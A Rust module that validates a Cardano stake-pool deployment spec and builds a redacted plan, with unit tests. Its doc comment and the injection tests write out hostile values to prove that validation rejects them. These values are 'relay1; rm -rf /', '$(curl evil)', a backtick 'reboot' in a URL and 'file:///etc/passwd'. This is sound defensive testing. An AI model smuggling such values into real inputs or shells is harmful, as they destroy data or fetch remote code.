use serde::{Deserialize, Serialize};
use serde_json::json;
use std::{collections::BTreeSet, fs, path::Path};

use crate::{secrets::CredentialRef, OuroError, Result};

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct PoolSpec {
    pub spec_version: u8,
    pub pool: Pool,
    pub topology_mode: TopologyMode,
    pub node_version: String,
    pub machines: Vec<Machine>,
    pub sync: Sync,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct Pool {
    pub ticker: String,
    pub network: Network,
    pub network_magic: u64,
    pub genesis_hashes: GenesisHashes,
    pub metadata_url: String,
    pub pledge_lovelace: u64,
    pub margin: f64,
    pub cost_lovelace: u64,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Network {
    Mainnet,
    Preprod,
    Preview,
}

impl Network {
    pub fn magic(self) -> u64 {
        match self {
            Network::Mainnet => 764_824_073,
            Network::Preprod => 1,
            Network::Preview => 2,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Network::Mainnet => "mainnet",
            Network::Preprod => "preprod",
            Network::Preview => "preview",
        }
    }
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct GenesisHashes {
    pub byron: Option<String>,
    pub shelley: String,
    pub alonzo: Option<String>,
    pub conway: Option<String>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum TopologyMode {
    P2p,
    Legacy,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct Machine {
    pub id: String,
    pub role: MachineRole,
    pub public_endpoint: Option<Endpoint>,
    pub ssh: SshTarget,
    /// S0017 p2-4 — OPTIONAL declared supervision runtime. Absent (v1 default) means
    /// "undeclared": the mechanism must DETECT the mode (detect/runtime) and, per p2-5/p2-6,
    /// fail closed on a detected↔declared mismatch. Declaring it lets `ouro-ops init` record
    /// and verify the mode rather than assume a bare process. Never a substitute for detection.
    #[serde(default)]
    pub runtime: Option<RuntimeDecl>,
}

/// Declared supervision runtime for a machine (advisory; verified against detect/runtime).
#[derive(Debug, Clone, Deserialize, Serialize, PartialEq, Eq)]
pub struct RuntimeDecl {
    pub mode: RuntimeMode,
    /// systemd unit name (mode=systemd). Container name/id and image ref (mode=docker|podman).
    #[serde(default)]
    pub unit: Option<String>,
    #[serde(default)]
    pub container: Option<String>,
    #[serde(default)]
    pub image: Option<String>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum RuntimeMode {
    Bare,
    Systemd,
    Docker,
    Podman,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum MachineRole {
    Bp,
    Relay,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct Endpoint {
    pub host: String,
    pub port: u16,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct SshTarget {
    pub host: String,
    pub port: u16,
    pub user: String,
    pub key_ref: CredentialRef,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct Sync {
    pub mode: SyncMode,
    pub mithril: Option<MithrilSync>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum SyncMode {
    Mithril,
    Genesis,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct MithrilSync {
    pub aggregator_endpoint: String,
    pub genesis_verification_key_ref: CredentialRef,
    pub verify_snapshot_digest: bool,
}

impl PoolSpec {
    pub fn from_file(path: &Path) -> Result<Self> {
        let text = fs::read_to_string(path)?;
        let spec: PoolSpec = match path.extension().and_then(|ext| ext.to_str()) {
            Some("yaml" | "yml") => serde_yaml::from_str(&text).map_err(|err| {
                OuroError::Validation(format!("pool spec yaml parse failed: {err}"))
            })?,
            _ => serde_json::from_str(&text)?,
        };
        spec.validate()?;
        Ok(spec)
    }

    pub fn validate(&self) -> Result<()> {
        if self.spec_version != 1 {
            return Err(OuroError::Validation("spec_version must be 1".to_string()));
        }
        if self.pool.network_magic != self.pool.network.magic() {
            return Err(OuroError::Validation(format!(
                "network_magic {} does not match {:?}",
                self.pool.network_magic, self.pool.network
            )));
        }
        self.pool.genesis_hashes.validate()?;
        if self.pool.ticker.len() < 3 || self.pool.ticker.len() > 5 {
            return Err(OuroError::Validation(
                "pool ticker must be 3-5 characters".to_string(),
            ));
        }
        // S0016 p4-1 — content validation of every field the target L2 scripts interpolate.
        // Defense in depth over S0015 shell-quoting: a crafted spec is rejected at validate()
        // time, so a hostile value never reaches a rendered config, a topology file, or a
        // shell. (schema only bounds these by minLength:1 — the real gate is here.)
        if !self.pool.ticker.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit()) {
            return Err(OuroError::Validation(
                "pool ticker must be uppercase alphanumeric [A-Z0-9]".to_string(),
            ));
        }
        reject_unsafe_url("pool.metadata_url", &self.pool.metadata_url)?;
        if !(0.0..=1.0).contains(&self.pool.margin) {
            return Err(OuroError::Validation(
                "pool margin must be between 0 and 1".to_string(),
            ));
        }
        let mut ids = BTreeSet::new();
        let mut bp_count = 0;
        let mut relay_count = 0;
        for machine in &self.machines {
            if !ids.insert(machine.id.as_str()) {
                return Err(OuroError::Validation(format!(
                    "duplicate machine id {}",
                    machine.id
                )));
            }
            // p4-1: id is used as OURO_MACHINE + a path/state component → single [a-z0-9-] segment.
            if machine.id.is_empty()
                || !machine.id.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
            {
                return Err(OuroError::Validation(format!(
                    "machine id must be a single [a-z0-9-] segment: {}",
                    machine.id
                )));
            }
            reject_unsafe_host(&format!("machine {} ssh.host", machine.id), &machine.ssh.host)?;
            if let Some(ep) = &machine.public_endpoint {
                reject_unsafe_host(&format!("machine {} public_endpoint.host", machine.id), &ep.host)?;
            }
            if machine.ssh.user != "ouro-exec" {
                return Err(OuroError::Validation(format!(
                    "machine {} must use ouro-exec ssh user",
                    machine.id
                )));
            }
            // p2-4: if runtime is DECLARED, it must be internally consistent — a systemd
            // declaration names a unit; a container declaration names a container or image.
            // (Absent = undeclared = fail-safe: detection governs; no assumption here.)
            if let Some(rt) = &machine.runtime {
                let named = |s: &Option<String>| s.as_deref().is_some_and(|v| !v.is_empty());
                match rt.mode {
                    RuntimeMode::Systemd if !named(&rt.unit) => {
                        return Err(OuroError::Validation(format!(
                            "machine {} runtime.mode=systemd requires runtime.unit",
                            machine.id
                        )));
                    }
                    RuntimeMode::Docker | RuntimeMode::Podman
                        if !named(&rt.container) && !named(&rt.image) =>
                    {
                        return Err(OuroError::Validation(format!(
                            "machine {} runtime.mode={:?} requires runtime.container or runtime.image",
                            machine.id, rt.mode
                        )));
                    }
                    _ => {}
                }
            }
            match machine.role {
                MachineRole::Bp => bp_count += 1,
                MachineRole::Relay => {
                    relay_count += 1;
                    if machine.public_endpoint.is_none() {
                        return Err(OuroError::Validation(format!(
                            "relay {} requires public_endpoint",
                            machine.id
                        )));
                    }
                }
            }
        }
        if bp_count != 1 {
            return Err(OuroError::Validation(
                "exactly one bp machine is required".to_string(),
            ));
        }
        if relay_count == 0 {
            return Err(OuroError::Validation(
                "at least one relay machine is required".to_string(),
            ));
        }
        if self.sync.mode == SyncMode::Mithril && self.sync.mithril.is_none() {
            return Err(OuroError::Validation(
                "mithril sync requires mithril config".to_string(),
            ));
        }
        Ok(())
    }

    pub fn resolved_non_secret_plan(&self) -> serde_json::Value {
        let bp = self
            .machines
            .iter()
            .find(|machine| machine.role == MachineRole::Bp)
            .map(|machine| machine.id.as_str())
            .unwrap_or_default();
        let relays = self
            .machines
            .iter()
            .filter(|machine| machine.role == MachineRole::Relay)
            .map(|machine| {
                json!({
                    "id": machine.id,
                    "public_endpoint": machine.public_endpoint
                })
            })
            .collect::<Vec<_>>();
        json!({
            "spec_version": self.spec_version,
            "pool": {
                "ticker": self.pool.ticker,
                "network": self.pool.network.as_str(),
                "network_magic": self.pool.network_magic,
                "genesis_hashes": self.pool.genesis_hashes,
                "metadata_url": self.pool.metadata_url,
                "pledge_lovelace": self.pool.pledge_lovelace,
                "margin": self.pool.margin,
                "cost_lovelace": self.pool.cost_lovelace
            },
            "topology_mode": self.topology_mode,
            "node_version": self.node_version,
            "machines": {
                "bp": bp,
                "relays": relays,
                "count": self.machines.len()
            },
            "sync": {
                "mode": self.sync.mode,
                "mithril_enabled": self.sync.mode == SyncMode::Mithril
            },
            "secrets": {
                "policy": "redacted",
                "credential_refs_present": self.credential_ref_count()
            }
        })
    }

    fn credential_ref_count(&self) -> usize {
        let ssh_refs = self.machines.len();
        let mithril_refs = usize::from(self.sync.mithril.is_some());
        ssh_refs + mithril_refs
    }
}

impl GenesisHashes {
    fn validate(&self) -> Result<()> {
        for (name, value) in [
            ("byron", self.byron.as_ref()),
            ("shelley", Some(&self.shelley)),
            ("alonzo", self.alonzo.as_ref()),
            ("conway", self.conway.as_ref()),
        ] {
            if let Some(value) = value {
                if value.len() < 16
                    || value.len() > 128
                    || !value.chars().all(|ch| ch.is_ascii_hexdigit())
                {
                    return Err(OuroError::Validation(format!(
                        "genesis hash {name} must be 16-128 hex characters"
                    )));
                }
            }
        }
        Ok(())
    }
}

/// p4-1 — a hostname/IP a target script will interpolate. Allow only DNS/IP characters; any
/// shell metacharacter, whitespace, or control char is rejected (a value like
/// `relay1; rm -rf /` or `$(curl evil)` never reaches a rendered config or a shell).
fn reject_unsafe_host(field: &str, value: &str) -> Result<()> {
    if value.is_empty()
        || value.len() > 253
        || !value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
    {
        return Err(OuroError::Validation(format!(
            "{field} must be a hostname/IP of [A-Za-z0-9.:-]: got {value:?}"
        )));
    }
    Ok(())
}

/// p4-1 — a metadata URL a target script may echo into config. Require http(s), bound the
/// length, and reject shell metacharacters / whitespace / control chars.
fn reject_unsafe_url(field: &str, value: &str) -> Result<()> {
    let ok_scheme = value.starts_with("https://") || value.starts_with("http://");
    let clean = value.chars().all(|c| {
        !c.is_ascii_control()
            && !c.is_whitespace()
            && !matches!(
                c,
                '`' | '$' | ';' | '|' | '&' | '"' | '\'' | '\\' | '<' | '>' | '(' | ')' | '{' | '}'
            )
    });
    if !ok_scheme || value.len() > 200 || !clean {
        return Err(OuroError::Validation(format!(
            "{field} must be a clean http(s) URL (no shell metacharacters): got {value:?}"
        )));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{Network, PoolSpec};

    #[test]
    fn validates_network_magic() {
        let mut spec: PoolSpec = serde_json::from_str(include_str!(
            "../../../tests/fixtures/pool-spec/valid-minimal.json"
        ))
        .unwrap();
        assert!(spec.validate().is_ok());
        spec.pool.network = Network::Mainnet;
        assert!(spec.validate().is_err());
    }

    fn valid_spec() -> PoolSpec {
        serde_json::from_str(include_str!(
            "../../../tests/fixtures/pool-spec/valid-minimal.json"
        ))
        .unwrap()
    }

    #[test]
    fn rejects_injection_in_interpolated_fields() {
        // p4-1: each field a target script interpolates must reject shell/DNS-unsafe values.
        let base = valid_spec();
        assert!(base.validate().is_ok(), "baseline fixture is valid");

        let mut s = valid_spec();
        s.machines[0].ssh.host = "relay1; rm -rf /".to_string();
        assert!(s.validate().is_err(), "shell metachars in ssh.host rejected");

        let mut s = valid_spec();
        if let Some(ep) = s.machines.iter_mut().find_map(|m| m.public_endpoint.as_mut()) {
            ep.host = "$(curl evil)".to_string();
            assert!(s.validate().is_err(), "command-sub in endpoint.host rejected");
        }

        let mut s = valid_spec();
        s.pool.metadata_url = "https://x/`reboot`.json".to_string();
        assert!(s.validate().is_err(), "backtick in metadata_url rejected");

        let mut s = valid_spec();
        s.pool.metadata_url = "file:///etc/passwd".to_string();
        assert!(s.validate().is_err(), "non-http(s) metadata_url rejected");

        let mut s = valid_spec();
        s.machines[0].id = "bp 1; touch x".to_string();
        assert!(s.validate().is_err(), "space/metachar in machine id rejected");

        let mut s = valid_spec();
        s.pool.ticker = "ab;".to_string();
        assert!(s.validate().is_err(), "non-alnum ticker rejected");
    }

    #[test]
    fn runtime_declaration_optional_and_consistency_checked() {
        use super::{RuntimeDecl, RuntimeMode};

        // p2-4 fail-safe: absent runtime (the v1 default) is valid — detection governs.
        let base = valid_spec();
        assert!(base.machines[0].runtime.is_none());
        assert!(base.validate().is_ok(), "undeclared runtime is valid");

        // A well-formed declaration is accepted.
        let mut s = valid_spec();
        s.machines[0].runtime = Some(RuntimeDecl {
            mode: RuntimeMode::Systemd,
            unit: Some("cardano-node.service".to_string()),
            container: None,
            image: None,
        });
        assert!(s.validate().is_ok(), "systemd + unit is valid");

        // systemd without a unit is rejected (a declaration must name its target).
        let mut s = valid_spec();
        s.machines[0].runtime = Some(RuntimeDecl {
            mode: RuntimeMode::Systemd,
            unit: None,
            container: None,
            image: None,
        });
        assert!(s.validate().is_err(), "systemd without unit rejected");

        // docker/podman without a container OR image is rejected.
        let mut s = valid_spec();
        s.machines[0].runtime = Some(RuntimeDecl {
            mode: RuntimeMode::Docker,
            unit: None,
            container: None,
            image: None,
        });
        assert!(s.validate().is_err(), "docker without container/image rejected");

        // bare needs no extra fields.
        let mut s = valid_spec();
        s.machines[0].runtime = Some(RuntimeDecl {
            mode: RuntimeMode::Bare,
            unit: None,
            container: None,
            image: None,
        });
        assert!(s.validate().is_ok(), "bare needs no target field");
    }

    #[test]
    fn resolved_plan_redacts_credential_refs() {
        let spec =
            PoolSpec::from_file(std::path::Path::new("examples/pool-spec.minimal.yaml")).unwrap();
        let plan = spec.resolved_non_secret_plan();
        let text = serde_json::to_string(&plan).unwrap();
        assert!(text.contains("\"policy\":\"redacted\""));
        assert!(!text.contains("creds://"));
    }
}
